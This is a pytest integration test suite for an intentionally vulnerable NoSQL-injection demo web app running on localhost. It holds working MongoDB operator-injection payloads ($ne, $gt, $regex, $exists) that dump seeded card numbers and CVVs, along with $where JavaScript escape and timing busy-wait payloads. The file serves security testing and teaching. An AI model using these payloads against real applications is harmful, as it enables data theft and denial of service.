"""Functional tests for the vulnerable NoSQL-injection demo app in ``vuln_apps``.

These tests exercise an *already-running* Docker Compose stack that serves the
vulnerable Flask app at ``http://localhost:8080`` (see
``vuln_apps/docker-compose.yml``). They are integration tests: if the stack is
not reachable, the whole module is skipped.

The app exposes four injection endpoints, each with a different NoSQL injection
flaw:

* ``/acct?account_id=...``
    Operator injection -- ``?account_id[$ne]=`` turns the lookup filter into
    ``{"id": {"$ne": ""}}`` and dumps every payment record (card numbers + CVV).
* ``/userdata?name=...``
    ``$where`` JavaScript string-escape injection (quoted context) -- a crafted
    payload breaks out of the string literal and forces the ``$where`` function
    to return ``true`` for every document.
* ``/orderdata?order=...``
    ``$where`` JavaScript string-escape injection (same technique, different
    collection).
* ``/numericdata?order=...``
    ``$where`` JavaScript integer-escape injection (numeric context, no quotes)
    -- a crafted payload injects JS without needing to break out of quotes.
    This endpoint also supports timing-based injection (a sleep loop in the
    ``$where`` function delays the response).

Each endpoint is tested with a *baseline* (a normal single-record lookup) and an
*injection* (a crafted payload that dumps the whole collection or causes a
delay). The injection tests assert the full collection is returned or the
response is delayed, demonstrating the vulnerability.

Start the stack first, then run:

    cd vuln_apps && docker compose up -d --build
    pytest tests/test_vuln_app.py -v
"""

import os
import re
import time

import pytest
import requests

# Base URL of the running compose stack. Override with NOSQLMAP_APP_URL if the
# stack is served somewhere else.
BASE_URL = os.environ.get("NOSQLMAP_APP_URL", "http://localhost:8080").rstrip("/")
TIMEOUT = 30

# --- Expected seed data (from vuln_apps/docker/mongo/mongo.nosql) -------------
# paymentinfo: (name, id, card_number, cvv2)
PAYMENTS = [
    ("Adrien", "42", "5555123456789999", "1234"),
    ("Justin", "99", "5555123456780000", "4321"),
    ("Robin", "1", "3333444455556666", "2222"),
    ("Moses", "2", "4444555566667777", "3333"),
    ("Rick", "3", "5555666677778888", "5678"),
    ("Nobody", "0", "45009876543215555", "9999"),
]
# users: (name, username, email)
USERS = [
    ("Adrien", "adrien", "adrien@sec642.org"),
    ("Justin", "justin", "justin@sec642.org"),
    ("Robin", "digininja", "digininja@sec642.org"),
    ("Moses", "adrien", "moses@sec642.org"),
    ("Rick", "rick", "rick@sec642.org"),
    ("Nobody", "administrator", "root@sec642.org"),
]
# orders: (id, name, item, quantity)
ORDERS = [
    ("42", "Adrien", "Fuzzy pink towel", "1"),
    ("99", "Justin", "Bird supplies", "4"),
    ("1", "Robin", "Music gift cards", "100"),
    ("1001", "Moses", "Miami Heat tickets", "1000"),
    ("66", "Rick", "Black hoodie", "1"),
    ("0", "Nobody", "Nothing", "0"),
]

# Injection payload for the $where string-escape endpoints (quoted context).
# It breaks out of the string literal and forces the $where function to return
# true for every document.
WHERE_STRING_INJECTION = "' ; return true; '"

# Injection payload for the $where integer-escape endpoint (numeric context).
# It injects JS directly without breaking out of quotes.
WHERE_INTEGER_INJECTION = "1; return true;"

# Timing payload: sleeps ~2 seconds per document via a busy-wait loop in the
# $where function. With 6 seeded documents the total delay is ~12 seconds.
WHERE_TIMING_PAYLOAD = (
    "1; var date = new Date(); var curDate = null; "
    "do { curDate = new Date(); } "
    "while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 2); "
    "return true;"
)


def _strip_html(html):
    """Remove HTML tags and collapse whitespace for simple text assertions."""
    text = re.sub(r"<[^>]+>", " ", html)
    return re.sub(r"\s+", " ", text).strip()


def _get(path, params):
    """GET ``path`` with ``params`` and return the response body as plain text."""
    resp = requests.get(BASE_URL + path, params=params, timeout=TIMEOUT)
    resp.raise_for_status()
    return _strip_html(resp.text)


def _count(text, marker):
    """Count how many times ``marker`` appears in ``text`` (one per record)."""
    return text.count(marker)


@pytest.fixture(scope="module")
def app():
    """Skip the whole module if the compose stack is not reachable."""
    try:
        requests.get(BASE_URL + "/", timeout=TIMEOUT)
    except requests.exceptions.RequestException as exc:
        pytest.skip(
            "vulnerable app not reachable at %s (%s). Start the stack first: "
            "cd vuln_apps && docker compose up -d --build" % (BASE_URL, type(exc).__name__)
        )
    return BASE_URL


# --- Index page ----------------------------------------------------------------
def test_index_page_loads(app):
    """The landing page is served and links to the vulnerable forms."""
    html = requests.get(app + "/", timeout=TIMEOUT).text
    assert "Customer Information" in html
    assert "acct" in html
    assert "numericdata" in html


# --- /acct: operator injection -------------------------------------------------
def test_acct_baseline_single_record(app):
    """A normal lookup by customer ID returns exactly that customer's card."""
    text = _get("/acct", {"account_id": "42"})
    # Adrien's card is returned...
    assert "5555123456789999" in text
    # ...and only one record is found.
    assert _count(text, "Card Number:") == 1


def test_acct_injection_ne_dumps_all_cards(app):
    """``?account_id[$ne]=`` injects a $ne operator and dumps every payment record."""
    text = _get("/acct", {"account_id[$ne]": ""})
    assert _count(text, "Card Number:") == len(PAYMENTS)
    for _name, _id, card, _cvv in PAYMENTS:
        assert card in text


def test_acct_injection_gt_dumps_all_cards(app):
    """``?account_id[$gt]=`` injects a $gt operator and dumps every payment record."""
    text = _get("/acct", {"account_id[$gt]": ""})
    assert _count(text, "Card Number:") == len(PAYMENTS)
    for _name, _id, card, _cvv in PAYMENTS:
        assert card in text


def test_acct_injection_regex_dumps_all_cards(app):
    """``?account_id[$regex]=`` injects a $regex operator and dumps every payment record."""
    text = _get("/acct", {"account_id[$regex]": ""})
    assert _count(text, "Card Number:") == len(PAYMENTS)
    for _name, _id, card, _cvv in PAYMENTS:
        assert card in text


def test_acct_injection_exists_dumps_all_cards(app):
    """``?account_id[$exists]=`` injects a $exists operator and dumps every payment record."""
    text = _get("/acct", {"account_id[$exists]": ""})
    assert _count(text, "Card Number:") == len(PAYMENTS)
    for _name, _id, card, _cvv in PAYMENTS:
        assert card in text


# --- /userdata: $where string-escape injection ---------------------------------
def test_user_baseline_returns_matches(app):
    """A normal name search returns only the matching user(s)."""
    text = _get("/userdata", {"name": "adrien"})
    # Two seeded users share the username "adrien".
    assert _count(text, "Username:") == 2
    assert "adrien@sec642.org" in text


def test_user_injection_dumps_all_users(app):
    """A $where string-escape payload dumps the entire users collection."""
    text = _get("/userdata", {"name": WHERE_STRING_INJECTION})
    assert _count(text, "Username:") == len(USERS)
    for _name, _username, email in USERS:
        assert email in text


# --- /orderdata: $where string-escape injection --------------------------------
def test_order_baseline_single_record(app):
    """A normal order lookup by ID returns exactly that order."""
    text = _get("/orderdata", {"order": "42"})
    assert "Fuzzy pink towel" in text
    assert _count(text, "Order ID:") == 1


def test_order_injection_dumps_all_orders(app):
    """A $where string-escape payload dumps the entire orders collection."""
    text = _get("/orderdata", {"order": WHERE_STRING_INJECTION})
    assert _count(text, "Order ID:") == len(ORDERS)
    for _id, _name, item, _qty in ORDERS:
        assert item in text


# --- /numericdata: $where integer-escape injection -----------------------------
def test_numeric_baseline_single_record(app):
    """A normal numeric lookup by order ID returns exactly that order."""
    text = _get("/numericdata", {"order": "42"})
    assert "Fuzzy pink towel" in text
    assert _count(text, "Order ID:") == 1


def test_numeric_injection_dumps_all_orders(app):
    """A $where integer-escape payload (no quotes) dumps the entire orders collection."""
    text = _get("/numericdata", {"order": WHERE_INTEGER_INJECTION})
    assert _count(text, "Order ID:") == len(ORDERS)
    for _id, _name, item, _qty in ORDERS:
        assert item in text


# --- /numericdata: timing-based injection --------------------------------------
def test_numeric_timing_delays_response(app):
    """A $where timing payload (sleep loop) delays the response by several seconds."""
    start = time.monotonic()
    text = _get("/numericdata", {"order": WHERE_TIMING_PAYLOAD})
    elapsed = time.monotonic() - start
    # The sleep loop runs per document (6 docs x ~2s = ~12s total).
    # Assert a significant delay (well above a normal <1s response).
    assert elapsed > 5, f"Expected a timing delay > 5s, got {elapsed:.1f}s"
    # The injection also dumps all records (the payload returns true for every doc).
    assert _count(text, "Order ID:") == len(ORDERS)
